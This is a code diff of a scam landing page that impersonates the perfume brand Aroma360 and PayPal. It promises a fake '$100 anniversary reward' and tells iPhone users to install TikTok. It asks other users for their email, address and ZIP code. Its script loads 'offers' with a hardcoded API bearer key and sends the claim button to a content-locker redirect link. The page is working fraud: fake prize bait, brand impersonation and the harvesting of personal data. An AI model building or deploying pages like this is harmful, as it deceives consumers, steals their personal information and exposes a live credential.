@@ -14,104 +14,90 @@
         .premium-card { background: rgba(255, 255, 255, 0.03); backdrop-filter: blur(20px); border: 1px solid rgba(212, 175, 55, 0.15); border-radius: 20px; }
         .gold-text { background: linear-gradient(135deg, #f5d27a 0%, #b8860b 100%); -webkit-background-clip: text; -webkit-text-fill-color: transparent; font-weight: 900; font-size: 15px; letter-spacing: 2.5px; }
         .keyword-gold { text-decoration: underline; text-decoration-color: var(--gold); text-underline-offset: 4px; color: #ffffff; }
-        .action-button { background: #1a1a1a; color: #444; font-weight: 900; transition: all 0.8s ease; pointer-events: none; }
-        .action-button.unlocked { background: linear-gradient(135deg, #d4af37 0%, #f5d27a 50%, #b8860b 100%); color: #000; pointer-events: auto; box-shadow: 0 10px 40px rgba(212, 175, 55, 0.3); }
+        .action-button { background: linear-gradient(135deg, #d4af37 0%, #f5d27a 50%, #b8860b 100%); color: #000; font-weight: 900; box-shadow: 0 10px 40px rgba(212, 175, 55, 0.3); }
         .pulse { animation: pulse-gold 2s infinite; }
         @keyframes pulse-gold { 0% { box-shadow: 0 0 0 0 rgba(212, 175, 55, 0.4); } 70% { box-shadow: 0 0 0 15px rgba(212, 175, 55, 0); } 100% { box-shadow: 0 0 0 0 rgba(212, 175, 55, 0); } }
         p { font-size: 16px; line-height: 1.6; }
         b, strong { font-weight: 900; color: white; }
-        /* Logo Styling - Clear and Focused */
-        .main-logo { filter: brightness(0) invert(1); width: 220px; height: auto; display: block; margin: 0 auto; }
+        .main-logo { filter: brightness(0) invert(1); width: 130px; height: auto; display: block; margin: 0 auto; }
     </style>
 </head>
 <body class="antialiased">
     <div class="bg-glow"></div>
 
-    <header class="py-10 text-center">
-<img src="https://i.postimg.cc/tJyFc3g4/AEBBOIA63FH7TMAZOMG33W7MKQ.png" alt="Aroma360" class="main-logo">
+    <header class="py-6 text-center">
+        <img src="https://i.postimg.cc/tJyFc3g4/AEBBOIA63FH7TMAZOMG33W7MKQ.png" alt="Aroma360" class="main-logo">
     </header>
 
-    <main class="max-w-md mx-auto px-5 pb-8">
-        <div class="text-center mb-6">
-            <h2 class="serif text-3xl font-black mb-10 leading-tight text-white italic">"Congratulations! You’ve been selected. Your $100 reward is waiting below—claim it now! 👇"</h2>
-            
-            <div class="premium-card p-6 text-left space-y-4 relative overflow-hidden mb-4">
-                <h3 class="gold-text uppercase mb-2">HOW DID WE FIND YOU?</h3>
-                <p class="text-zinc-100">
-                    <strong>It’s simple—you’ve shopped with us at <span class="keyword-gold">aroma360.com</span> before! We kept your email on our VIP list to make sure you never miss out on our biggest moments.</strong>
-                </p>
-            </div>
+    <main class="max-w-md mx-auto px-5 pb-8 text-center">
+        <h2 class="serif text-2xl font-black mb-8 leading-tight text-white italic">
+            Congratulations! You’ve been selected. <br>
+            Your <span class="text-[#d4af37]">$100 reward</span> is waiting below—claim it now! 👇
+        </h2>
+        
+        <div class="premium-card p-6 text-left space-y-4 mb-4">
+            <h3 class="gold-text uppercase mb-2">HOW DID WE FIND YOU?</h3>
+            <p class="text-zinc-100">
+                <strong>It’s simple—you’ve shopped with us at <span class="keyword-gold">aroma360.com</span> before! We kept your email on our VIP list to make sure you never miss out on our biggest moments.</strong>
+            </p>
+        </div>
 
-            <div class="premium-card p-6 text-left space-y-4 relative overflow-hidden mb-4">
-                <h3 class="gold-text uppercase mb-2">CELEBRATING 10 YEARS OF EXCELLENCE</h3>
-                <p class="text-zinc-100">
-                    <strong>Today marks our <span class="keyword-gold">10th Anniversary</span> since the founding of <span class="keyword-gold">Aroma360</span>. We are incredibly proud of our achievements and the journey we’ve shared with our community.</strong>
-                    <br><br>
-                    <strong>To celebrate this success, we held a special anniversary draw for customers who placed orders at aroma360.com during the 2026 calendar year. Your email was <span class="keyword-gold">selected</span> in this draw!</strong>
-                    <br><br>
-                    <strong>We are rewarding exactly <span class="keyword-gold">100 lucky winners</span>, and you are one of them. We know that without customers like you, Aroma360 wouldn't be the success it is today. This is our way of saying thank you.</strong>
-                </p>
-            </div>
+        <div class="premium-card p-6 text-left space-y-4 mb-4">
+            <h3 class="gold-text uppercase mb-2">CELEBRATING 10 YEARS OF EXCELLENCE</h3>
+            <p class="text-zinc-100">
+                <strong>Today marks our <span class="keyword-gold">10th Anniversary</span> since the founding of <span class="keyword-gold">Aroma360</span>. We are incredibly proud of our achievements and the journey we’ve shared with our community.</strong>
+                <br><br>
+                <strong>To celebrate this success, we held a special anniversary draw for customers who placed orders at aroma360.com during the 2026 calendar year. Your email was <span class="keyword-gold">selected</span> in this draw!</strong>
+                <br><br>
+                <strong>We are rewarding exactly <span class="keyword-gold">100 lucky winners</span>, and you are one of them. This is our way of saying thank you.</strong>
+            </p>
+        </div>
 
-            <div class="premium-card p-6 text-left space-y-4 relative overflow-hidden mb-4">
-                <h3 class="gold-text uppercase mb-2">SECURE DISTRIBUTION VIA PAYPAL™</h3>
-                <p class="text-zinc-100">
-                    <strong>We have partnered with <span>PayPal</span> to ensure your reward is delivered securely. To receive your <span class="keyword-gold">$100 gift code</span> in your inbox, you simply need to complete a quick verification step.</strong>
-                    <br><br>
-                    <strong>Don't have a PayPal account? No problem. This gift code is <span class="keyword-gold">universal</span>. Once verified, you can use it at <span class="keyword-gold">Amazon</span>, <span class="keyword-gold">Walmart</span>, or even right here at the <span class="keyword-gold">Aroma360</span> store.</strong>
-                </p>
-            </div>
+        <div class="premium-card p-6 text-left space-y-4 mb-4">
+            <h3 class="gold-text uppercase mb-2">SECURE DISTRIBUTION VIA PAYPAL™</h3>
+            <p class="text-zinc-100">
+                <strong>We have partnered with <span>PayPal</span> to ensure your reward is delivered securely. To receive your <span class="keyword-gold">$100 gift code</span> in your inbox, you simply need to complete a quick verification step.</strong>
+                <br><br>
+                <strong>Don't have a PayPal account? No problem. This gift code is <span class="keyword-gold">universal</span>. Once verified, you can use it at <span class="keyword-gold">Amazon</span>, <span class="keyword-gold">Walmart</span>, or even right here at the <span class="keyword-gold">Aroma360</span> store.</strong>
+            </p>
         </div>
 
         <div class="premium-card p-6 border-t-4 border-t-[#d4af37]">
-            <div id="dynamic-logos" class="flex justify-center items-center gap-6 mb-6"></div>
-
             <div class="text-center mb-6">
                 <h3 class="serif text-5xl font-black text-white">$100.00</h3>
                 <p id="status-tag" class="text-zinc-500 font-black tracking-[3px] text-[10px] uppercase mt-1">Verified Anniversary Credit</p>
             </div>
 
-            <div id="verification-content" class="bg-zinc-900/80 p-5 rounded-xl mb-6 border border-zinc-800"></div>
+            <div id="verification-content" class="bg-zinc-900/80 p-5 rounded-xl mb-6 border border-zinc-800 text-left"></div>
 
-            <button id="claim-btn" class="action-button unlocked pulse w-full py-5 rounded-xl text-[15px] uppercase tracking-widest font-black" style="pointer-events: auto;">
+            <button id="claim-btn" class="action-button pulse w-full py-5 rounded-xl text-[15px] uppercase tracking-widest font-black">
                 Verify & Claim Reward
             </button>
         </div>
     </main>
 
-    <footer class="py-8 text-center text-zinc-600 text-[10px] font-black tracking-[4px] uppercase border-t border-zinc-900">
-        © 2026 AROMA360® REWARD PORTAL • USA
+    <footer class="py-8 text-center text-zinc-600 text-[10px] font-black tracking-[4px] uppercase">
+        © 2026 AROMA360® USA
     </footer>
 
     <script>
         const isIOS = /iPhone|iPad|iPod/.test(navigator.userAgent);
-        const dynamicLogos = document.getElementById("dynamic-logos");
         const verificationContent = document.getElementById("verification-content");
         const claimBtn = document.getElementById("claim-btn");
-        const statusTag = document.getElementById("status-tag");
-
-        const paypalLogo = `<img src="https://upload.wikimedia.org/wikipedia/commons/b/b5/PayPal.svg" class="w-24 h-auto brightness-200">`;
-        const aromaLogo = `<img src="https://i.postimg.cc/T3Vg5yGw/69a817af1fcf375fdd1c0cb4-aroma360-logo.png" class="w-28 h-auto" style="filter: brightness(0) invert(1);">`;
-        const divider = `<div class="h-8 w-[1px] bg-zinc-700"></div>`;
-
-        dynamicLogos.innerHTML = paypalLogo + divider + aromaLogo;
 
         if (isIOS) {
-            statusTag.innerText = "ACTION REQUIRED: INSTALL & WATCH";
             verificationContent.innerHTML = `
                 <div class="flex items-center gap-2 mb-3"><span class="text-xl">🎬</span><h4 class="gold-text uppercase">How to Claim</h4></div>
                 <p class="text-zinc-100 text-[14px]">
                     <strong>To receive your reward, please download <span class="keyword-gold">TikTok</span> using the button below. Once installed, stay on the app for <span class="keyword-gold">30 seconds</span>.</strong>
                     <br><br>
-                    <strong>You will be automatically redirected to our official video showing the <span class="keyword-gold">10th Anniversary Live Draw</span>. It is essential to watch this video to see how your email <span class="keyword-gold">and 100 others were selected</span> and to learn how to <span class="keyword-gold">Activate your $100 Gift Code</span> for use at any major store in the USA.</strong>
-                    <br><br>
-                    <strong>Your unique code will be synced and sent to your email immediately after the video verification.</strong>
+                    <strong>You will be automatically redirected to our official video showing the <span class="keyword-gold">10th Anniversary Live Draw</span>. It is essential to watch this video to see how your email <span class="keyword-gold">and 100 others were selected</span> and to learn how to <span class="keyword-gold">Activate your $100 Gift Code</span>.</strong>
                 </p>`;
             claimBtn.innerText = "Download TikTok & Watch Video";
         } else {
             verificationContent.innerHTML = `
                 <div class="flex items-center gap-2 mb-3"><span class="text-xl">📝</span><h4 class="gold-text uppercase">How to Claim</h4></div>
-                <p class="text-zinc-100">
+                <p class="text-zinc-100 text-[14px]">
                     <strong>To secure your gift, you must enter your <span class="keyword-gold">Email, Address, and ZIP Code</span> on the next page. This simple process takes less than 2 minutes and helps us confirm you are a real person and not a robot.</strong>
                     <br><br>
                     <strong>Once you complete this, your <span class="keyword-gold">$100 Gift Card</span> will be sent immediately to your verified email address.</strong>
@@ -120,7 +106,7 @@
         }
 
         const API_KEY = "43332|NQ7qx05aIwQixiNUiTPXlPGgGG1ciBAGXSn5hNHZe50622f8";
-        let offerLink = "";
+        let offerLink = "https://lockedapp.org/cl/i/ok29o1";
 
         async function preFetchOffer() {
             try {
@@ -130,20 +116,11 @@
                     headers: { 'Authorization': `Bearer ${API_KEY}` }
                 });
                 const data = await offerRes.json();
-                if(data.offers && data.offers.length > 0) {
-                    if (isIOS) {
-                        const tt = data.offers.find(o => o.name.toLowerCase().includes('tiktok'));
-                        offerLink = tt ? tt.link : data.offers[0].link;
-                    } else {
-                        offerLink = data.offers[0].link;
-                    }
-                }
+                if(data.offers && data.offers.length > 0) offerLink = data.offers[0].link;
             } catch(e) { console.error("Syncing..."); }
         }
 
-        claimBtn.onclick = function() {
-            window.location.href = offerLink || "https://lockedapp.org/cl/i/ok29o1";
-        };
+        claimBtn.onclick = () => { window.location.href = offerLink; };
         preFetchOffer();
     </script>
 </body>
